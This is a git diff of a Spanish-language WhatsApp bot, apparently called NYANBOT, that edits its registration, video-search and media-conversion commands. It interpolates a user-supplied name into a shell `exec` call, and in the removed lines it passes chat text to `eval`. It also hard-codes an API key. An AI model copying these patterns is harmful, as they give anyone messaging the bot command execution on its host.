-if (edad > 30) return reply(`Uuuu, yastas viejito:c\n*Lo siento pero no puedo registrarte si eres mayor de 30 años*`)
+if (nombre.length >= 20) return reply(`*Tu nombre es acaso un tren?*\nUn nombre no puede tener mas de *10* letras`)
+if (edad > 50) return reply(`Uuuu, yastas viejito:c\n*Lo siento pero no puedo registrarte si eres mayor de 30 años*`)
 if (edad < 13) return reply(`Eres menor de 13 años, no puedo hacer un registro tuyo lo siento.\n*Si quieres muestrame una autorizacion de tus padres diciendo que puedes pasar tiempo usando este bot para que pueda aceptarte:d*`)
 try {
 ppimg = await samu330.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
@@ -4444,7 +4359,7 @@ veri = sender
 addRegisteredUser(sender, nombre, edad, time, serialUser)
 try {
 exec(`magick './src/reg.jpg' -gravity west -fill '#00FF00' -font './src/font-gue.ttf' -size 1280x710 -pointsize 90 -interline-spacing 7.5 -annotate +460-45 '${nombre}' -pointsize 50 -annotate +460+200 '${serialUser}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite 'regsm.jpg'`)
-samu330.sendMessage(from, fs.readFileSync('./regsm.jpg'), MessageType.image, { quoted: sam, caption: `*「 SU REGISTRO FUE UN EXITO😉 」*\n\n *◦ Nombre : ${nombre}*\n*◦ Numero : wa.me/${sender.split("@")[0]}*\n*◦ Edad : ${edad}*\n*◦ Hora De Registro : ${time}*\n*◦ SN : ${serialUser}*\n\n *📋Su registro fue todo un exito*\n\n*Para Continuar Usando a NYANBOT Escriba el siguiente comando: ${prefix}menu*`})
+samu330.sendMessage(from, fs.readFileSync('regsm.jpg'), MessageType.image, { quoted: sam, caption: `*「 SU REGISTRO FUE UN EXITO😉 」*\n\n *◦ Nombre : ${nombre}*\n*◦ Numero : wa.me/${sender.split("@")[0]}*\n*◦ Edad : ${edad}*\n*◦ Hora De Registro : ${time}*\n*◦ SN : ${serialUser}*\n\n *📋Su registro fue todo un exito*\n\n*Para Continuar Usando a NYANBOT Escriba el siguiente comando: ${prefix}menu*`})
 } catch {
 reply(`*「 SU REGISTRO FUE UN EXITO😉 」*\n\n *◦ Nombre : ${nombre}*\n*◦ Numero : wa.me/${sender.split("@")[0]}*\n*◦ Edad : ${edad}*\n*◦ Hora De Registro : ${time}*\n*◦ SN : ${serialUser}*\n\n *📋Su registro fue todo un exito*\n\n*Para Continuar Usando a NYANBOT Escriba el siguiente comando: ${prefix}menu*`)
 }
@@ -4920,28 +4835,46 @@ console.log('succes unmute chat = ' + from)
 break
 case 'facebook':
 case 'fb':
-if (!isUrl) return reply('Y el Link?')
-if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply('*Seas mmon... link de Facebook!!!*')
+if (args.length < 1) return reply('Y el link? ')
+if(!isUrl(args[0]) && !args[0].includes('facebook')) return reply('LINK DE FACEBOOK MLDT STUPID!!')
+teks = args.join(' ')
 reply(mess.wait)
-hx.fbdown(q)
-.then(result => {
-reply(result)
-sendMediaURL(from,result,`*Link Del Video*`)
+res = await fbDown(teks).catch(e => {
+  reply(mess.ferr)
 })
-break
-
-case 'test3':
-hx.youtube(q)
-.then(result => {
-reply(`${result}`)
-})
+a = res[0]
+result = `
+Titulo :* ${a.judul}
+*Source :* ${a.source}
+*Tamaño :* ${a.size}
+*Calidad :* ${a.quality}
+*Tipo :* ${a.type}
+*Name File :* ${a.judul}.${a.type}
+`
+sendFileFromUrl(a.thumb, image, {caption: result, quoted: sam})
+sendFileFromUrl(a.link, video, { mimetype: 'video/mp4',quoted: sam, filename: `${a.judul}.${a.type}`})
 break
 
 case 'ytsearch':
 if (args.length == 0) return reply(`Ejemplo: ${prefix + command} Me olvide de vivir`)
-resvi = await yts(q)
+query = args.join(' ')
+try {
+get_result = await getJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${api}&query=${query}`)
+get_result = get_result.result
+ini_txt = ""
+for (var x of get_result) {
+ini_txt += `*◦Titulo* : ${x.title}\n`
+ini_txt += `*◦Vistas* : ${x.views}\n`
+ini_txt += `◦Publicado el ${x.published}\n`
+ini_txt += `📸Thumbnail : ${x.thumbnail}\n`
+ini_txt += `📲Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
+}
+reply(ini_txt)
+} catch {
+reply(`Servidor *1* con problemas, realizando tu busqueda de *${q}* en el servidor *2*`)
+res = await yts(q)
 searchyt = ``
-for (let i of resvi.all) {
+for (let i of res.all) {
 searchyt += `
 *Titulo :* ${i.title}
 *ID Video :* ${i.videoId}
@@ -4954,7 +4887,8 @@ searchyt += `
 `
 }
 var samusamuxd = searchyt.trim()
-sendFileFromUrl(resvi.all[0].image, image, {quoted: fimg, caption: samusamuxd, sendEphemeral: true})
+sendFileFromUrl(res.all[0].image, image, {quoted: fimg, caption: samusamuxd, sendEphemeral: true})
+}
 addFilter(from)
 break
 
@@ -5535,16 +5469,15 @@ fs.unlinkSync(ran)
 }
 break
 case 'agif':
-agif = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
+ger = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
+var imgbb = require('imgbb-uploader')
 reply('*Espera un momento...*')
-owgig = await samu330.downloadAndSaveMediaMessage(agif)
-var rang = getRandom('.gif')
-exec(`ffmpeg -i ${owgig} ${rang}`, (err) => {
-fs.unlinkSync(owgig)
-if (err) return reply('error')
-toptg = fs.readFileSync(rang)
-samu330.sendMessage(from, toptg, MessageType.gif, {mimetype: 'video/gif', quoted: faud})
-})
+owgi = await samu330.downloadAndSaveMediaMessage(ger)
+data = await imgbb("b0fc132474ca03ee7898fd5cac7275fe", owgi)
+anu = await getJson(`https://api.lolhuman.xyz/api/convert/webptomp4?apikey=${api}&img=${data.display_url}`)
+result = await getBuffer(anu.result)
+samu330.sendMessage(from, result, video, {quoted: ftoko, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒', mimetype: 'video/gif'})
+
 break
 case 'toptt':
 reply(`wait..`)
@@ -5559,6 +5492,7 @@ samu330.sendMessage(from, topt, MessageType.audio, {mimetype: 'audio/mp4', quote
 })
 break
 case 'stickertag':
+		
 if (!isGroup) return await reply(mess.only.group)
 if (!isAdmin && !isOwner && !itsMe) return await reply('This command only for admin')
 if (!isQuotedImage && !isImage) return await reply('Etiqueta un stiker')
@@ -5566,122 +5500,6 @@ media = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')
 buffer = await samu330.downloadMediaMessage(media)
 await wa.hideTagSticker(from, buffer)
 break
-
-case 'totag':
-if (!isGroup) return reply(mess.only.group)
-if ((isMedia && !sam.message.videoMessage || isQuotedSticker) && args.length == 0) {
-encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
-file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
-value = args.join(" ")
-var group2 = await samu330.groupMetadata(from)
-var member = group2['participants']
-var mem = []
-member.map(async adm => {
-mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
-})
-var options = {
-contextInfo: { mentionedJid: mem },
-quoted: fvid
-}
-ini_buffer = fs.readFileSync(file)
-samu330.sendMessage(from, ini_buffer, sticker, options)
-fs.unlinkSync(file)
-} else if ((isMedia && !sam.message.videoMessage || isQuotedImage) && args.length == 0) {
-encmediau = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
-file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
-value = args.join(" ")
-var group26 = await samu330.groupMetadata(from)
-var member = group26['participants']
-var mem = []
-member.map(async adm => {
-mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
-})
-var options = {
-contextInfo: { mentionedJid: mem },
-quoted: fvid
-}
-ini_buffer = fs.readFileSync(file)
-samu330.sendMessage(from, ini_buffer, image, options)
-fs.unlinkSync(file)
-} else if ((isMedia && !sam.message.videoMessage || isQuotedAudio) && args.length == 0) {
-encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
-file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
-value = args.join(" ")
-var group25 = await samu330.groupMetadata(from)
-var member = group25['participants']
-var mem = []
-member.map(async adm => {
-mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
-})
-var options = {
-mimetype : 'audio/mp4', duration: 9999999,
-ptt : true,
-contextInfo: { mentionedJid: mem },
-quoted: faud
-}
-ini_buffer = fs.readFileSync(file)
-samu330.sendMessage(from, ini_buffer, audio, options)
-fs.unlinkSync(file)
-} else if ((isMedia && !sam.message.videoMessage || isQuotedVideo) && args.length == 0) {
-encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
-file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
-value = args.join(" ")
-var group24 = await samu330.groupMetadata(from)
-var member = group24['participants']
-var mem = []
-member.map(async adm => {
-mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
-})
-var options = {
-mimetype : 'video/gif',
-contextInfo: { mentionedJid: mem },
-quoted: fvid
-}
-ini_buffer = fs.readFileSync(file)
-samu330.sendMessage(from, ini_buffer, video, options)
-fs.unlinkSync(file)
-} else if ((isMedia && !sam.message.videoMessage || isQuotedDocument) && args.length == 0) {
-encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
-file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
-value = args.join(" ")
-var group23 = await samu330.groupMetadata(from)
-var member = group23['participants']
-var mem = []
-member.map(async adm => {
-mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
-})
-var options = {
-mimetype : 'text/plain',
-contextInfo: { mentionedJid: mem },
-quoted: fdoc
-}
-ini_buffer = fs.readFileSync(file)
-denz.sendMessage(from, ini_buffer, document, options)
-fs.unlinkSync(file)
-}  else if ((isMedia && !sam.message.videoMessage || isQuotedVideo) && args.length == 0) {
-encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
-file = await samu330.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
-value = args.join(" ")
-var group21 = await samu330.groupMetadata(from)
-var member = group21['participants']
-var mem = []
-member.map(async adm => {
-mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
-})
-var options = {
-mimetype : 'video/mp4', duration: 555555555,
-contextInfo: { mentionedJid: mem },
-quoted: fvid
-}
-ini_buffer = fs.readFileSync(file)
-samu330.sendMessage(from, ini_buffer, video, options)
-fs.unlinkSync(file)
-} else{
-reply(`Etiqueta un texto/documento/gif/sticker/audio/video con el comando: ${prefix}totag`)
-}
-break
-
-
 case 'promote':
 addFilter(from)
 if (!isGroup) return await reply(mess.only.group)
@@ -6041,26 +5859,6 @@ if (args[0] === '1') {
 	reply('1 para activar, 0 para desactivar')        
 }                          
 break
-
-case 'antibot':            
-if (!isGroup) return reply(mess.only.group)
-if (!isAdmin) return reply(mess.only.admin)     
-if (args.length < 1) return reply('Escribe *1* para activar')                    
-if (args[0] === '1') {                             
-	if (isAntiBot) return reply('*Ya está activo*')          
-	antibot.push(from)             
-	fs.writeFileSync('./src/antibot.json', JSON.stringify(antibot))      
-	reply(`*[ Activado ]*`)  
-} else if (args[0] === '0') {           
-	reply(`*AHORA....*\nCualquier otro Bot de Baileys sera eliminado!!`)  
-	var ini = antibot.indexOf(from)
-	antibot.splice(ini, 1)                  
-	fs.writeFileSync('./src/antibot.json', JSON.stringify(antibot))      
-	reply(`Desactivado`)              
-} else {                                
-	reply('1 para activar, 0 para desactivar')        
-}                          
-break
 					
 			case 'antibad':
                                         if (!isGroup) return reply(mess.only.group)
@@ -6205,11 +6003,7 @@ if (body.startsWith('>')){
             } catch(e){
             reply(`${String(e)}`)
             }}
-if (body.startsWith("=")) {
-return await reply(JSON.stringify(eval(args.join(" ")), null, 2))
-}
-
-if (body.contain('buenos dias')) {
+if (body.startsWith('buenos dias')) {
 dias = fs.readFileSync(`./temp/audio/wenas.mp3`)
 samu330.sendMessage(from, dias, audio, {quoted: fliveLoc, mimetype: 'audio/mp4', ptt:true, duration: -999999})
 }
